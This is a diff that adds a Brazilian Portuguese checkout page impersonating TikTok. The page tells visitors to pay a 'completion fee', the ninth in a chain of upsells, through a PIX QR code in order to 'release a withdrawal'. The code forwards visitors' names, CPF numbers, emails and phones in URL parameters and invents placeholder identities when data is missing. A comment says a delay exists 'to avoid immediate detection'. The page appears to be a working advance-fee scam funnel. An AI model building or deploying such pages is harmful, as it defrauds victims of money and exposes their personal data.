@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout - TikTok</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="../../central.php?format=js"></script>
+    <style>
+        /* CSS inline para produção */
+        body { font-family: 'Inter', sans-serif; background-color: #FFFFFF; color: #161823; }
+
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.2s ease;
+        }
+        .btn-tiktok:active { transform: scale(0.96); opacity: 0.9; }
+
+        .logo-sharp {
+            filter: contrast(1.1) brightness(1.05);
+            image-rendering: -webkit-optimize-contrast;
+        }
+
+        .hidden { display: none; }
+
+        /* Estilos do Sistema PIX */
+        .qr-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .qr-code {
+            background: white;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+
+        .qr-code img {
+            width: 200px;
+            height: 200px;
+            display: block;
+        }
+
+        .pix-code {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            word-break: break-all;
+            color: #333;
+        }
+
+        .copy-btn {
+            width: 100%;
+            background: #003366;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background: #002244;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FE2C55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading p {
+            color: #666;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .error {
+            text-align: center;
+            padding: 30px 20px;
+            background: #fff5f5;
+            border: 1px solid #feb2b2;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+
+        .error i {
+            color: #e53e3e;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .error p {
+            color: #c53030;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .retry-btn {
+            background: #e53e3e;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .retry-btn:hover {
+            background: #c53030;
+        }
+    </style>
+<script src="../../link.php"></script></head>
+<body class="antialiased">
+    <div class="bg-black text-white text-center py-2 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+        Finalize seu pagamento para liberar o saque
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+        <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm">
+            <div class="text-center">
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento</p>
+                <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="amount">R$ 0,00</h2>
+            </div>
+        </div>
+
+        <div class="px-6 py-8">
+            <div id="payment" style="display: none;">
+                <div class="qr-container">
+                    <div class="qr-code">
+                        <img id="qrImage" src="" alt="QR Code PIX">
+                    </div>
+                </div>
+
+                <div class="pix-code">
+                    <div style="font-size: 11px; color: #666; margin-bottom: 8px; font-weight: 600;">Codigo PIX (Copiar e Colar)</div>
+                    <div id="pixCode"></div>
+                </div>
+
+                <button class="copy-btn" onclick="copyPixCode(event)">
+                    <i class="fas fa-copy"></i>
+                    Copiar Codigo PIX
+                </button>
+            </div>
+
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <p>Gerando QR Code para pagamento...</p>
+            </div>
+
+            <div id="error" class="error" style="display: none;">
+                <i class="fas fa-exclamation-circle"></i>
+                <p id="errorMessage"></p>
+                <button class="retry-btn" onclick="generatePayment()">
+                    <i class="fas fa-redo"></i>
+                    Tentar Novamente
+                </button>
+            </div>
+        </div>
+
+        <!-- Sucesso -->
+        <div id="successSection" class="hidden px-6 py-8">
+            <div class="text-center">
+                <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h3 class="text-2xl font-black mb-2 text-green-600">Pagamento Confirmado!</h3>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configura��o do upsell
+        const UPSELL_CONFIG = {
+            value: (window.getCentralPrice && window.getCentralPrice('up9', (window.__UP_FEE_9 || 0))) || (window.__UP_FEE_9 || 0),
+            productName: 'UPSELL9',
+            description: 'Taxa de Finaliza��o Completa',
+            upsellNumber: 9
+        };
+
+        // Fun��o para capturar UTMs
+        function getUtmParams() {
+            const params = new URLSearchParams(window.location.search);
+            const utmParams = {};
+
+            // Captura todos os par�metros UTM
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
+             'CampaignID', 'adSETID', 'CreativeID', 'pixel_id', 'click_id'].forEach(key => {
+                if (params.has(key)) {
+                    utmParams[key] = params.get(key);
+                }
+            });
+
+            return utmParams;
+        }
+
+        // Função para detectar caminhos corretos
+        function getApiBaseUrl() {
+            if (window.location.hostname === 'localhost') {
+                // Detectar automaticamente o caminho correto
+                const pathParts = window.location.pathname.split('/');
+                pathParts.pop(); // remove index.html
+                pathParts.pop(); // remove checkout
+                pathParts.pop(); // remove up9
+                pathParts.pop(); // remove up
+                return window.location.origin + pathParts.join('/') + '/production';
+            } else {
+                const pathParts = window.location.pathname.split('/');
+                pathParts.pop(); // remove index.html
+                pathParts.pop(); // remove checkout
+                pathParts.pop(); // remove up9
+                pathParts.pop(); // remove up
+                return window.location.origin + pathParts.join('/') + '/production';
+            }
+        }
+
+        // Função para detectar caminho base do projeto
+        function getBasePath() {
+            const currentPath = window.location.pathname;
+            const pathParts = currentPath.split('/');
+            // Remove 'checkout' e 'index.html' do final
+            pathParts.pop(); // remove index.html
+            pathParts.pop(); // remove checkout
+            pathParts.pop(); // remove up9
+            pathParts.pop(); // remove up
+            const basePath = pathParts.join('/');
+            return basePath; // fallback removido para evitar duplo slash //
+        }
+
+        // Fun��o para gerar pagamento
+        
+        // Carrega dados do cliente preenchidos no /funil/resgatar
+        function getCustomerData() {
+            try {
+                var ss = sessionStorage.getItem('ttk_confirmar_state');
+                if (ss) {
+                    var parsed = JSON.parse(ss);
+                    if (parsed && parsed.customerData) return parsed.customerData;
+                }
+            } catch(e) {}
+            // Fallback: query params
+            var p = new URLSearchParams(window.location.search);
+            var n = p.get('cn'), d = p.get('cd'), e = p.get('ce'), ph = p.get('cp');
+            if (n || d || e || ph) return { name: n||'', document: d||'', email: e||'', phone: ph||'' };
+            return null;
+        }
+
+        async function generatePayment() {
+            console.log('generatePayment iniciado com UPSELL_CONFIG:', UPSELL_CONFIG);
+            const loading = document.getElementById('loading');
+            const payment = document.getElementById('payment');
+            const error = document.getElementById('error');
+
+            loading.style.display = 'block';
+            payment.style.display = 'none';
+            error.style.display = 'none';
+
+            // Mostra o warning-box novamente quando recarrega
+            const warningBox = document.querySelector('.warning-box');
+            if (warningBox) {
+                warningBox.style.display = 'flex';
+            }
+
+            try {
+                const utmParams = getUtmParams();
+                const baseURL = getApiBaseUrl();
+
+                // Monta URL com par�metros UTM
+                const url = new URL(baseURL + '/paradise_api.php');
+                Object.keys(utmParams).forEach(key => {
+                    url.searchParams.append(key, utmParams[key]);
+                });
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        value: UPSELL_CONFIG.value,
+                        payerName: (function(){ var c = getCustomerData(); return c && c.name ? c.name : 'Pagamento Seguro ' + Date.now(); })(),
+                        productName: UPSELL_CONFIG.productName + ' ' + Math.random().toString(36).substr(2, 5),
+                        description: UPSELL_CONFIG.description,
+                        utm_source: utmParams.utm_source || '',
+                        email: (function(){ var c = getCustomerData(); return c && c.email ? c.email : 'upsell9_' + Date.now() + '@teste.com'; })(),
+                        document: (function(){ var c = getCustomerData(); return c && c.document ? c.document : '1234567890' + Math.floor(Math.random() * 9) + 1; })(),
+                        phone: (function(){ var c = getCustomerData(); return c && c.phone ? c.phone : '1199999999' + Math.floor(Math.random() * 9) + 1; })()
+                    })
+                });
+
+                // Verifica se a resposta foi bem-sucedida
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Erro HTTP ${response.status}: ${errorText || 'Resposta vazia'}`);
+                }
+
+                // Verifica se h� conte�do antes de fazer parse
+                const responseText = await response.text();
+                if (!responseText || responseText.trim() === '') {
+                    throw new Error('Resposta vazia do servidor');
+                }
+
+                let data;
+                try {
+                    data = JSON.parse(responseText);
+                } catch (parseError) {
+                    console.error('Erro ao fazer parse do JSON:', parseError);
+                    console.error('Resposta recebida:', responseText);
+                    throw new Error('Resposta inv�lida do servidor: ' + responseText.substring(0, 100));
+                }
+
+                if (!data.success) {
+                    throw new Error(data.error || 'Erro ao gerar pagamento');
+                }
+
+                // Exibe dados do pagamento
+                document.getElementById('amount').textContent = data.value.toFixed(2).replace('.', ',');
+
+                // Exibe Codigo PIX e QR Code
+                if (data.paymentInfo && data.paymentInfo.qrCode) {
+                    document.getElementById('pixCode').textContent = data.paymentInfo.qrCode;
+                }
+
+                if (data.paymentInfo && data.paymentInfo.base64QrCode) {
+                    document.getElementById('qrImage').src = data.paymentInfo.base64QrCode;
+                }
+
+                // Salva dados no localStorage
+                try {
+                    const transactionData = {
+                        transactionId: data.paymentInfo.id,
+                        amount: data.value,
+                        amountInCents: Math.round(data.value * 100),
+                        utm_source: utmParams.utm_source || '',
+                        savedAt: new Date().toISOString()
+                    };
+                    localStorage.setItem(`upsell${UPSELL_CONFIG.upsellNumber}_transaction_${data.paymentInfo.id}`, JSON.stringify(transactionData));
+                } catch (e) {
+                    console.warn('Erro ao salvar no localStorage:', e);
+                }
+
+                loading.style.display = 'none';
+                payment.style.display = 'block';
+
+                // Esconde o warning-box quando o payment aparece
+                const warningBox = document.querySelector('.warning-box');
+                if (warningBox) {
+                    warningBox.style.display = 'none';
+                }
+
+                // Adiciona delay antes de iniciar polling para evitar detecção imediata
+                console.log('⏳ Iniciando verificação de pagamento em 2 segundos...');
+                setTimeout(() => {
+                    console.log('🔍 Iniciando polling de status do pagamento...');
+                    startPaymentPolling(data.paymentInfo.id);
+                }, 2000); // 2 segundos de delay
+
+            } catch (err) {
+                console.error('Erro ao gerar pagamento:', err);
+                loading.style.display = 'none';
+                error.style.display = 'block';
+                document.getElementById('errorMessage').textContent = err.message || 'Erro ao gerar Codigo PIX. Tente novamente.';
+            }
+        }
+
+        // Fun��o para copiar Codigo PIX
+        function copyPixCode(event) {
+            const pixCode = document.getElementById('pixCode').textContent;
+            navigator.clipboard.writeText(pixCode).then(() => {
+                const btn = event.target.closest('button');
+                const icon = btn.querySelector('i');
+                const originalText = btn.innerHTML;
+                icon.className = 'fas fa-check';
+                btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                btn.style.background = '#28a745';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.style.background = '#003366';
+                }, 2000);
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+                alert('Erro ao copiar Codigo. Selecione e copie manualmente.');
+            });
+        }
+
+        // Fun��o para verificar status do pagamento
+        async function startPaymentPolling(transactionId) {
+            const baseURL = getApiBaseUrl();
+            const utmParams = getUtmParams();
+
+            let pollCount = 0;
+            const maxPolls = 60; // Máximo de 60 verificações (3 minutos)
+            const checkInterval = setInterval(async () => {
+                pollCount++;
+                console.log(`⏳ Polling #${pollCount} - Status: PENDENTE - Verificando transação: ${transactionId}`);
+                try {
+                    const url = new URL(baseURL + '/paradise_api.php?transactionId=' + transactionId);
+                    Object.keys(utmParams).forEach(key => {
+                        url.searchParams.append(key, utmParams[key]);
+                    });
+
+                    const response = await fetch(url);
+
+                    if (!response.ok) {
+                        console.warn('Erro ao verificar status:', response.status);
+                        return;
+                    }
+
+                    const responseText = await response.text();
+                    if (!responseText || responseText.trim() === '') {
+                        console.warn('Resposta vazia ao verificar status');
+                        return;
+                    }
+
+                    let data;
+                    try {
+                        data = JSON.parse(responseText);
+                        console.log(`📊 Status retornado: ${data.status || 'DESCONHECIDO'} (Transaction: ${data.transactionId})`);
+                    } catch (parseError) {
+                        console.error('Erro ao fazer parse do JSON no polling:', parseError);
+                        return;
+                    }
+
+                    // Verifica se o pagamento foi aprovado
+                    if (data.status === 'APPROVED' || data.status === 'COMPLETED' || data.status === 'AUTHORIZED') {
+                        clearInterval(checkInterval);
+                        console.log('✅ Pagamento APROVADO! Redirecionando para página inicial...');
+
+                        // Mostra tela de sucesso
+                        document.getElementById('payment').style.display = 'none';
+                        document.getElementById('successSection').classList.remove('hidden');
+
+                        // Preserva UTMs no redirecionamento
+                        const utmParams = getUtmParams();
+                        const basePath = getBasePath();
+                        const redirectUrl = new URL(basePath + '/index.html', window.location.origin);
+                        Object.keys(utmParams).forEach(key => {
+                            redirectUrl.searchParams.append(key, utmParams[key]);
+                        });
+                        // Passa dados do cliente para o próximo upsell
+                        var _cd = getCustomerData();
+                        if (_cd) {
+                            if (_cd.name) redirectUrl.searchParams.append('cn', _cd.name);
+                            if (_cd.document) redirectUrl.searchParams.append('cd', _cd.document);
+                            if (_cd.email) redirectUrl.searchParams.append('ce', _cd.email);
+                            if (_cd.phone) redirectUrl.searchParams.append('cp', _cd.phone);
+                        }
+
+                        setTimeout(() => {
+                            window.location.replace(redirectUrl.toString());
+                        }, 2000);
+                    } else if (pollCount >= maxPolls) {
+                        clearInterval(checkInterval);
+                        console.log('⏰ Tempo limite excedido. Parando verificação.');
+                    }
+                } catch (err) {
+                    console.error('Erro ao verificar pagamento:', err);
+                }
+            }, 3000); // Verifica a cada 3 segundos
+        }
+
+        // Carrega o valor do upsell e inicia gera��o
+        async function loadUpsellValue() {
+            console.log('Iniciando loadUpsellValue para up9...');
+            try {
+                const response = await fetch('../../../production/get-upsell-value.php?upsell=up9');
+                console.log('Resposta recebida:', response.status);
+                const data = await response.json();
+                console.log('Dados recebidos:', data);
+                if (data.success) {
+                    console.log('Dados válidos recebidos:', data);
+                    // Atualiza o valor na tela
+                    const amountElement = document.getElementById('amount');
+                    console.log('Elemento amount encontrado:', !!amountElement);
+                    if (amountElement) {
+                        amountElement.textContent = data.formatted;
+                        console.log('Valor atualizado na tela para:', data.formatted);
+                        console.log('Conteúdo atual do elemento:', amountElement.textContent);
+                    }
+                    // Atualiza o valor na configura��o
+                    UPSELL_CONFIG.value = data.value;
+                    console.log('UPSELL_CONFIG.value atualizado para:', data.value);
+                } else {
+                    console.log('Dados não válidos:', data);
+                }
+            } catch (error) {
+                console.error('Erro ao carregar valor:', error);
+            }
+            // Aguarda um pouco e inicia geração do pagamento
+            setTimeout(() => {
+                console.log('Iniciando generatePayment com valor:', UPSELL_CONFIG.value);
+                generatePayment();
+            }, 500);
+        }
+
+        // Inicia ao carregar p�gina
+        // Inicia ao carregar página
+        // Função para rolar até a área de pagamento
+        function scrollToPayment() {
+            setTimeout(() => {
+                const target = document.getElementById('loading') || document.getElementById('payment');
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }, 1000); // Pequeno delay para garantir que elementos estejam renderizados
+        }
+
+        // Inicia ao carregar pgina
+        window.addEventListener('DOMContentLoaded', function() {
+            // Limpa dados antigos do localStorage para evitar interferências
+            try {
+                const keys = Object.keys(localStorage);
+                keys.forEach(key => {
+                    if (key.startsWith('upsell9_transaction_')) {
+                        localStorage.removeItem(key);
+                    }
+                });
+            } catch (e) {
+                console.warn('Erro ao limpar localStorage:', e);
+            }
+
+            loadUpsellValue();
+            scrollToPayment(); // Rola para a área de pagamento
+        });
+    </script>
+</body>
+</html>
+
+
